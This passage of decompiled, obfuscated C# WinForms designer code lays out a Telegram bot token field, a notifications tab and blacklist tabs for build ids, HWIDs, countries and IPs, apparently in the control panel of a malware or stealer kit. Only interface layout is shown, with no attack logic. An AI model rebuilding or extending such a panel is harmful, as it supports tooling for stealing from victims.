        ((MetroSet_UI.Controls.MetroSetLabel)this.m_b4).Style = MetroSet_UI.Design.Style.Dark;
        ((MetroSet_UI.Controls.MetroSetLabel)this.m_b4).StyleManager = null;
        ((System.Windows.Forms.Control)this.m_b4).TabIndex = 119;
        ((System.Windows.Forms.Control)this.m_b4).Text = "Waiting";
        ((System.Windows.Forms.Label)this.m_b4).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
        ((MetroSet_UI.Controls.MetroSetLabel)this.m_b4).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetLabel)this.m_b4).ThemeName = "MetroDark";
        ((System.Windows.Forms.Control)this.m_b5).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.m_b5).Location = new System.Drawing.Point(367, 441);
        ((System.Windows.Forms.Control)this.m_b5).Name = "telegramBotStatusLbl";
        ((System.Windows.Forms.Control)this.m_b5).Size = new System.Drawing.Size(85, 25);
        ((MetroSet_UI.Controls.MetroSetLabel)this.m_b5).Style = MetroSet_UI.Design.Style.Dark;
        ((MetroSet_UI.Controls.MetroSetLabel)this.m_b5).StyleManager = null;
        ((System.Windows.Forms.Control)this.m_b5).TabIndex = 118;
        ((System.Windows.Forms.Control)this.m_b5).Text = "Status of bot:";
        ((System.Windows.Forms.Label)this.m_b5).TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
        ((MetroSet_UI.Controls.MetroSetLabel)this.m_b5).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetLabel)this.m_b5).ThemeName = "MetroDark";
        ((GuiLib.AnimaTextBox)this.m_b6).Dark = false;
        ((System.Windows.Forms.Control)this.m_b6).Location = new System.Drawing.Point(366, 415);
        ((GuiLib.AnimaTextBox)this.m_b6).MaxLength = 32767;
        ((GuiLib.AnimaTextBox)this.m_b6).MultiLine = false;
        ((System.Windows.Forms.Control)this.m_b6).Name = "telegramApiTokenTb";
        ((GuiLib.AnimaTextBox)this.m_b6).Numeric = false;
        ((GuiLib.AnimaTextBox)this.m_b6).ReadOnly = false;
        ((System.Windows.Forms.Control)this.m_b6).Size = new System.Drawing.Size(334, 23);
        ((System.Windows.Forms.Control)this.m_b6).TabIndex = 54;
        ((GuiLib.AnimaTextBox)this.m_b6).UseSystemPasswordChar = false;
        ((System.Windows.Forms.Control)this.b7).AutoSize = true;
        ((System.Windows.Forms.Control)this.b7).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.b7).ForeColor = System.Drawing.Color.FromArgb(170, 170, 170);
        ((System.Windows.Forms.Control)this.b7).Location = new System.Drawing.Point(369, 396);
        ((System.Windows.Forms.Control)this.b7).Name = "telegramApiTokenLbl";
        ((System.Windows.Forms.Control)this.b7).Size = new System.Drawing.Size(85, 15);
        ((System.Windows.Forms.Control)this.b7).TabIndex = 53;
        ((System.Windows.Forms.Control)this.b7).Text = "Bot API Token:";
        ((System.Windows.Forms.Control)this.notificationTab).BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
        ((System.Windows.Forms.Control)this.notificationTab).Controls.Add((System.Windows.Forms.Control)this.notificationTb);
        ((System.Windows.Forms.Control)this.notificationTab).Font = new System.Drawing.Font("Segoe UI", 9f);
        ((System.Windows.Forms.Control)this.notificationTab).ForeColor = System.Drawing.Color.FromArgb(52, 56, 67);
        ((System.Windows.Forms.TabPage)this.notificationTab).Location = new System.Drawing.Point(194, 4);
        ((System.Windows.Forms.Control)this.notificationTab).Name = "notificationTab";
        ((System.Windows.Forms.Control)this.notificationTab).Size = new System.Drawing.Size(1168, 639);
        ((System.Windows.Forms.TabPage)this.notificationTab).TabIndex = 2;
        ((System.Windows.Forms.Control)this.notificationTab).Text = "Notifications";
        ((System.Windows.Forms.Control)this.notificationTb).BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
        ((System.Windows.Forms.TextBoxBase)this.notificationTb).BorderStyle = System.Windows.Forms.BorderStyle.None;
        ((System.Windows.Forms.Control)this.notificationTb).Dock = System.Windows.Forms.DockStyle.Fill;
        ((System.Windows.Forms.Control)this.notificationTb).ForeColor = System.Drawing.Color.Silver;
        ((System.Windows.Forms.Control)this.notificationTb).Location = new System.Drawing.Point(0, 0);
        ((System.Windows.Forms.Control)this.notificationTb).Name = "notificationTb";
        ((System.Windows.Forms.TextBoxBase)this.notificationTb).ReadOnly = true;
        ((System.Windows.Forms.RichTextBox)this.notificationTb).ScrollBars = System.Windows.Forms.RichTextBoxScrollBars.Vertical;
        ((System.Windows.Forms.Control)this.notificationTb).Size = new System.Drawing.Size(1168, 639);
        ((System.Windows.Forms.Control)this.notificationTb).TabIndex = 0;
        ((System.Windows.Forms.Control)this.notificationTb).Text = "";
        ((System.Windows.Forms.TextBoxBase)this.notificationTb).WordWrap = false;
        ((System.Windows.Forms.Control)this.f7).BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
        ((System.Windows.Forms.Control)this.f7).Controls.Add((System.Windows.Forms.Control)this.importBuilds);
        ((System.Windows.Forms.Control)this.f7).Controls.Add((System.Windows.Forms.Control)this.addBlackBuildBtn);
        ((System.Windows.Forms.Control)this.f7).Controls.Add((System.Windows.Forms.Control)this.blackBuildIdTb);
        ((System.Windows.Forms.Control)this.f7).Controls.Add((System.Windows.Forms.Control)this.label52);
        ((System.Windows.Forms.Control)this.f7).Controls.Add((System.Windows.Forms.Control)this.blackListBuildsLb);
        ((System.Windows.Forms.Control)this.f7).Controls.Add((System.Windows.Forms.Control)this.label53);
        ((System.Windows.Forms.Control)this.f7).Controls.Add((System.Windows.Forms.Control)this.importCountries);
        ((System.Windows.Forms.Control)this.f7).Controls.Add((System.Windows.Forms.Control)this.f8);
        ((System.Windows.Forms.Control)this.f7).Controls.Add((System.Windows.Forms.Control)this.f9);
        ((System.Windows.Forms.Control)this.f7).Controls.Add((System.Windows.Forms.Control)this.fa);
        ((System.Windows.Forms.Control)this.f7).Controls.Add((System.Windows.Forms.Control)this.fb);
        ((System.Windows.Forms.Control)this.f7).Controls.Add((System.Windows.Forms.Control)this.fc);
        ((System.Windows.Forms.Control)this.f7).Controls.Add((System.Windows.Forms.Control)this.fd);
        ((System.Windows.Forms.Control)this.f7).Controls.Add((System.Windows.Forms.Control)this.fe);
        ((System.Windows.Forms.Control)this.f7).Controls.Add((System.Windows.Forms.Control)this.ff);
        ((System.Windows.Forms.Control)this.f7).Controls.Add((System.Windows.Forms.Control)this.importIPs);
        ((System.Windows.Forms.Control)this.f7).Controls.Add((System.Windows.Forms.Control)this.addBlackIPBtn);
        ((System.Windows.Forms.Control)this.f7).Controls.Add((System.Windows.Forms.Control)this.blackIPTb);
        ((System.Windows.Forms.Control)this.f7).Controls.Add((System.Windows.Forms.Control)this.label23);
        ((System.Windows.Forms.Control)this.f7).Controls.Add((System.Windows.Forms.Control)this.blackListIPsLb);
        ((System.Windows.Forms.Control)this.f7).Controls.Add((System.Windows.Forms.Control)this.label24);
        ((System.Windows.Forms.Control)this.f7).Controls.Add((System.Windows.Forms.Control)this.addBlackCountryBtn);
        ((System.Windows.Forms.Control)this.f7).Controls.Add((System.Windows.Forms.Control)this.blackCountryTb);
        ((System.Windows.Forms.Control)this.f7).Controls.Add((System.Windows.Forms.Control)this.blackCountryLbl);
        ((System.Windows.Forms.Control)this.f7).Controls.Add((System.Windows.Forms.Control)this.blackListLb);
        ((System.Windows.Forms.Control)this.f7).Controls.Add((System.Windows.Forms.Control)this.blackListLbl);
        ((System.Windows.Forms.Control)this.f7).ForeColor = System.Drawing.Color.FromArgb(52, 56, 67);
        ((System.Windows.Forms.TabPage)this.f7).Location = new System.Drawing.Point(194, 4);
        ((System.Windows.Forms.Control)this.f7).Name = "blackListsTab";
        ((System.Windows.Forms.Control)this.f7).Size = new System.Drawing.Size(1168, 639);
        ((System.Windows.Forms.TabPage)this.f7).TabIndex = 18;
        ((System.Windows.Forms.Control)this.f7).Text = "Black Lists";
        ((MetroSet_UI.Controls.MetroSetButton)this.importBuilds).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.importBuilds).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.importBuilds).DisabledForeColor = System.Drawing.Color.Gray;
        ((System.Windows.Forms.Control)this.importBuilds).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
        ((MetroSet_UI.Controls.MetroSetButton)this.importBuilds).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.importBuilds).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.importBuilds).HoverTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.importBuilds).Location = new System.Drawing.Point(943, 401);
        ((System.Windows.Forms.Control)this.importBuilds).Name = "importBuilds";
        ((MetroSet_UI.Controls.MetroSetButton)this.importBuilds).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.importBuilds).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.importBuilds).NormalTextColor = System.Drawing.Color.White;
        ((MetroSet_UI.Controls.MetroSetButton)this.importBuilds).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.importBuilds).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.importBuilds).PressTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.importBuilds).Size = new System.Drawing.Size(75, 23);
        ((MetroSet_UI.Controls.MetroSetButton)this.importBuilds).Style = MetroSet_UI.Design.Style.Light;
        ((MetroSet_UI.Controls.MetroSetButton)this.importBuilds).StyleManager = null;
        ((System.Windows.Forms.Control)this.importBuilds).TabIndex = 147;
        ((System.Windows.Forms.Control)this.importBuilds).Text = "From File";
        ((MetroSet_UI.Controls.MetroSetButton)this.importBuilds).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetButton)this.importBuilds).ThemeName = "MetroLite";
        ((System.Windows.Forms.Control)this.importBuilds).Click += new System.EventHandler(importBuilds_Click);
        ((MetroSet_UI.Controls.MetroSetButton)this.addBlackBuildBtn).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.addBlackBuildBtn).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.addBlackBuildBtn).DisabledForeColor = System.Drawing.Color.Gray;
        ((System.Windows.Forms.Control)this.addBlackBuildBtn).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
        ((MetroSet_UI.Controls.MetroSetButton)this.addBlackBuildBtn).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.addBlackBuildBtn).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.addBlackBuildBtn).HoverTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.addBlackBuildBtn).Location = new System.Drawing.Point(943, 427);
        ((System.Windows.Forms.Control)this.addBlackBuildBtn).Name = "addBlackBuildBtn";
        ((MetroSet_UI.Controls.MetroSetButton)this.addBlackBuildBtn).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.addBlackBuildBtn).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.addBlackBuildBtn).NormalTextColor = System.Drawing.Color.White;
        ((MetroSet_UI.Controls.MetroSetButton)this.addBlackBuildBtn).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.addBlackBuildBtn).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.addBlackBuildBtn).PressTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.addBlackBuildBtn).Size = new System.Drawing.Size(75, 23);
        ((MetroSet_UI.Controls.MetroSetButton)this.addBlackBuildBtn).Style = MetroSet_UI.Design.Style.Light;
        ((MetroSet_UI.Controls.MetroSetButton)this.addBlackBuildBtn).StyleManager = null;
        ((System.Windows.Forms.Control)this.addBlackBuildBtn).TabIndex = 146;
        ((System.Windows.Forms.Control)this.addBlackBuildBtn).Text = "Add";
        ((MetroSet_UI.Controls.MetroSetButton)this.addBlackBuildBtn).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetButton)this.addBlackBuildBtn).ThemeName = "MetroLite";
        ((System.Windows.Forms.Control)this.addBlackBuildBtn).Click += new System.EventHandler(addBlackBuildBtn_Click);
        ((GuiLib.AnimaTextBox)this.blackBuildIdTb).Dark = false;
        ((System.Windows.Forms.Control)this.blackBuildIdTb).Location = new System.Drawing.Point(816, 427);
        ((GuiLib.AnimaTextBox)this.blackBuildIdTb).MaxLength = 32767;
        ((GuiLib.AnimaTextBox)this.blackBuildIdTb).MultiLine = false;
        ((System.Windows.Forms.Control)this.blackBuildIdTb).Name = "blackBuildIdTb";
        ((GuiLib.AnimaTextBox)this.blackBuildIdTb).Numeric = false;
        ((GuiLib.AnimaTextBox)this.blackBuildIdTb).ReadOnly = false;
        ((System.Windows.Forms.Control)this.blackBuildIdTb).Size = new System.Drawing.Size(112, 23);
        ((System.Windows.Forms.Control)this.blackBuildIdTb).TabIndex = 145;
        ((GuiLib.AnimaTextBox)this.blackBuildIdTb).UseSystemPasswordChar = false;
        ((System.Windows.Forms.Control)this.label52).AutoSize = true;
        ((System.Windows.Forms.Control)this.label52).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.label52).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
        ((System.Windows.Forms.Control)this.label52).Location = new System.Drawing.Point(819, 409);
        ((System.Windows.Forms.Control)this.label52).Name = "label52";
        ((System.Windows.Forms.Control)this.label52).Size = new System.Drawing.Size(89, 15);
        ((System.Windows.Forms.Control)this.label52).TabIndex = 144;
        ((System.Windows.Forms.Control)this.label52).Text = "Enter a build id:";
        ((System.Windows.Forms.Control)this.blackListBuildsLb).BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
        ((System.Windows.Forms.ListBox)this.blackListBuildsLb).BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
        ((System.Windows.Forms.Control)this.blackListBuildsLb).ContextMenuStrip = (System.Windows.Forms.ContextMenuStrip)this.blackListCms_7;
        ((System.Windows.Forms.Control)this.blackListBuildsLb).Cursor = System.Windows.Forms.Cursors.Default;
        ((System.Windows.Forms.Control)this.blackListBuildsLb).Font = new System.Drawing.Font("Consolas", 11.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.blackListBuildsLb).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
        ((System.Windows.Forms.ListBox)this.blackListBuildsLb).HorizontalScrollbar = true;
        ((System.Windows.Forms.ListBox)this.blackListBuildsLb).ItemHeight = 18;
        ((System.Windows.Forms.Control)this.blackListBuildsLb).Location = new System.Drawing.Point(816, 211);
        ((System.Windows.Forms.Control)this.blackListBuildsLb).Name = "blackListBuildsLb";
        ((System.Windows.Forms.Control)this.blackListBuildsLb).Size = new System.Drawing.Size(202, 182);
        ((System.Windows.Forms.Control)this.blackListBuildsLb).TabIndex = 143;
        ((System.Windows.Forms.Control)this.label53).Font = new System.Drawing.Font("Segoe UI", 15.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.label53).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
        ((System.Windows.Forms.Control)this.label53).Location = new System.Drawing.Point(820, 178);
        ((System.Windows.Forms.Control)this.label53).Name = "label53";
        ((System.Windows.Forms.Control)this.label53).Size = new System.Drawing.Size(198, 30);
        ((System.Windows.Forms.Control)this.label53).TabIndex = 142;
        ((System.Windows.Forms.Control)this.label53).Text = "Black list build ids:";
        ((System.Windows.Forms.Label)this.label53).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
        ((MetroSet_UI.Controls.MetroSetButton)this.importCountries).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.importCountries).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.importCountries).DisabledForeColor = System.Drawing.Color.Gray;
        ((System.Windows.Forms.Control)this.importCountries).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
        ((MetroSet_UI.Controls.MetroSetButton)this.importCountries).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.importCountries).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.importCountries).HoverTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.importCountries).Location = new System.Drawing.Point(241, 401);
        ((System.Windows.Forms.Control)this.importCountries).Name = "importCountries";
        ((MetroSet_UI.Controls.MetroSetButton)this.importCountries).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.importCountries).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.importCountries).NormalTextColor = System.Drawing.Color.White;
        ((MetroSet_UI.Controls.MetroSetButton)this.importCountries).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.importCountries).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.importCountries).PressTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.importCountries).Size = new System.Drawing.Size(75, 23);
        ((MetroSet_UI.Controls.MetroSetButton)this.importCountries).Style = MetroSet_UI.Design.Style.Light;
        ((MetroSet_UI.Controls.MetroSetButton)this.importCountries).StyleManager = null;
        ((System.Windows.Forms.Control)this.importCountries).TabIndex = 141;
        ((System.Windows.Forms.Control)this.importCountries).Text = "From File";
        ((MetroSet_UI.Controls.MetroSetButton)this.importCountries).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetButton)this.importCountries).ThemeName = "MetroLite";
        ((System.Windows.Forms.Control)this.importCountries).Click += new System.EventHandler(importCountries_Click);
        ((System.Windows.Forms.Control)this.f8).Location = new System.Drawing.Point(-5, 598);
        ((System.Windows.Forms.Control)this.f8).Name = "metroSetDivider11";
        ((MetroSet_UI.Controls.MetroSetDivider)this.f8).Orientation = MetroSet_UI.Enums.DividerStyle.Horizontal;
        ((System.Windows.Forms.Control)this.f8).Size = new System.Drawing.Size(1273, 4);
        ((MetroSet_UI.Controls.MetroSetDivider)this.f8).Style = MetroSet_UI.Design.Style.Dark;
        ((MetroSet_UI.Controls.MetroSetDivider)this.f8).StyleManager = null;
        ((System.Windows.Forms.Control)this.f8).TabIndex = 140;
        ((System.Windows.Forms.Control)this.f8).Text = "metroSetDivider11";
        ((MetroSet_UI.Controls.MetroSetDivider)this.f8).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetDivider)this.f8).ThemeName = "MetroDark";
        ((MetroSet_UI.Controls.MetroSetDivider)this.f8).Thickness = 1;
        ((MetroSet_UI.Controls.MetroSetButton)this.f9).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.f9).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.f9).DisabledForeColor = System.Drawing.Color.Gray;
        ((System.Windows.Forms.Control)this.f9).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
        ((MetroSet_UI.Controls.MetroSetButton)this.f9).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.f9).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.f9).HoverTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.f9).Location = new System.Drawing.Point(515, 608);
        ((System.Windows.Forms.Control)this.f9).Name = "metroSetButton2";
        ((MetroSet_UI.Controls.MetroSetButton)this.f9).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.f9).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.f9).NormalTextColor = System.Drawing.Color.White;
        ((MetroSet_UI.Controls.MetroSetButton)this.f9).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.f9).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.f9).PressTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.f9).Size = new System.Drawing.Size(133, 23);
        ((MetroSet_UI.Controls.MetroSetButton)this.f9).Style = MetroSet_UI.Design.Style.Light;
        ((MetroSet_UI.Controls.MetroSetButton)this.f9).StyleManager = null;
        ((System.Windows.Forms.Control)this.f9).TabIndex = 139;
        ((System.Windows.Forms.Control)this.f9).Text = "Save settings";
        ((MetroSet_UI.Controls.MetroSetButton)this.f9).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetButton)this.f9).ThemeName = "MetroLite";
        ((System.Windows.Forms.Control)this.f9).Click += new System.EventHandler(saveSettingsBtn_Click);
        ((MetroSet_UI.Controls.MetroSetButton)this.fa).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.fa).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.fa).DisabledForeColor = System.Drawing.Color.Gray;
        ((System.Windows.Forms.Control)this.fa).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
        ((MetroSet_UI.Controls.MetroSetButton)this.fa).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.fa).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.fa).HoverTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.fa).Location = new System.Drawing.Point(705, 401);
        ((System.Windows.Forms.Control)this.fa).Name = "importHWIDs";
        ((MetroSet_UI.Controls.MetroSetButton)this.fa).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.fa).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.fa).NormalTextColor = System.Drawing.Color.White;
        ((MetroSet_UI.Controls.MetroSetButton)this.fa).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.fa).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.fa).PressTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.fa).Size = new System.Drawing.Size(75, 23);
        ((MetroSet_UI.Controls.MetroSetButton)this.fa).Style = MetroSet_UI.Design.Style.Light;
        ((MetroSet_UI.Controls.MetroSetButton)this.fa).StyleManager = null;
        ((System.Windows.Forms.Control)this.fa).TabIndex = 138;
        ((System.Windows.Forms.Control)this.fa).Text = "From File";
        ((MetroSet_UI.Controls.MetroSetButton)this.fa).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetButton)this.fa).ThemeName = "MetroLite";
        ((System.Windows.Forms.Control)this.fa).Click += new System.EventHandler(fa_Click);
        ((MetroSet_UI.Controls.MetroSetButton)this.fb).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.fb).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.fb).DisabledForeColor = System.Drawing.Color.Gray;
        ((System.Windows.Forms.Control)this.fb).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
        ((MetroSet_UI.Controls.MetroSetButton)this.fb).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.fb).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.fb).HoverTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.fb).Location = new System.Drawing.Point(705, 427);
        ((System.Windows.Forms.Control)this.fb).Name = "addBlackHwidBtn";
        ((MetroSet_UI.Controls.MetroSetButton)this.fb).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.fb).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.fb).NormalTextColor = System.Drawing.Color.White;
        ((MetroSet_UI.Controls.MetroSetButton)this.fb).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.fb).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.fb).PressTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.fb).Size = new System.Drawing.Size(75, 23);
        ((MetroSet_UI.Controls.MetroSetButton)this.fb).Style = MetroSet_UI.Design.Style.Light;
        ((MetroSet_UI.Controls.MetroSetButton)this.fb).StyleManager = null;
        ((System.Windows.Forms.Control)this.fb).TabIndex = 137;
        ((System.Windows.Forms.Control)this.fb).Text = "Add";
        ((MetroSet_UI.Controls.MetroSetButton)this.fb).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetButton)this.fb).ThemeName = "MetroLite";
        ((System.Windows.Forms.Control)this.fb).Click += new System.EventHandler(fb_Click);
        ((GuiLib.AnimaTextBox)this.fc).Dark = false;
        ((System.Windows.Forms.Control)this.fc).Location = new System.Drawing.Point(587, 427);
        ((GuiLib.AnimaTextBox)this.fc).MaxLength = 32767;
        ((GuiLib.AnimaTextBox)this.fc).MultiLine = false;
        ((System.Windows.Forms.Control)this.fc).Name = "blackHwidTb";
        ((GuiLib.AnimaTextBox)this.fc).Numeric = false;
        ((GuiLib.AnimaTextBox)this.fc).ReadOnly = false;
        ((System.Windows.Forms.Control)this.fc).Size = new System.Drawing.Size(112, 23);
        ((System.Windows.Forms.Control)this.fc).TabIndex = 136;
        ((GuiLib.AnimaTextBox)this.fc).UseSystemPasswordChar = false;
        ((System.Windows.Forms.Control)this.fd).AutoSize = true;
        ((System.Windows.Forms.Control)this.fd).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.fd).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
        ((System.Windows.Forms.Control)this.fd).Location = new System.Drawing.Point(584, 409);
        ((System.Windows.Forms.Control)this.fd).Name = "label43";
        ((System.Windows.Forms.Control)this.fd).Size = new System.Drawing.Size(80, 15);
        ((System.Windows.Forms.Control)this.fd).TabIndex = 135;
        ((System.Windows.Forms.Control)this.fd).Text = "Enter a HWID:";
        ((System.Windows.Forms.Control)this.fe).BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
        ((System.Windows.Forms.ListBox)this.fe).BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
        ((System.Windows.Forms.Control)this.fe).ContextMenuStrip = (System.Windows.Forms.ContextMenuStrip)this.blackListCms_6;
        ((System.Windows.Forms.Control)this.fe).Cursor = System.Windows.Forms.Cursors.Default;
        ((System.Windows.Forms.Control)this.fe).Font = new System.Drawing.Font("Consolas", 11.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.fe).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
        ((System.Windows.Forms.ListBox)this.fe).HorizontalScrollbar = true;
        ((System.Windows.Forms.ListBox)this.fe).ItemHeight = 18;
        ((System.Windows.Forms.Control)this.fe).Location = new System.Drawing.Point(587, 211);
        ((System.Windows.Forms.Control)this.fe).Name = "blackListHWIDsLb";
        ((System.Windows.Forms.Control)this.fe).Size = new System.Drawing.Size(193, 182);
        ((System.Windows.Forms.Control)this.fe).TabIndex = 134;
        ((System.Windows.Forms.Control)this.ff).Font = new System.Drawing.Font("Segoe UI", 15.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.ff).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
        ((System.Windows.Forms.Control)this.ff).Location = new System.Drawing.Point(587, 178);
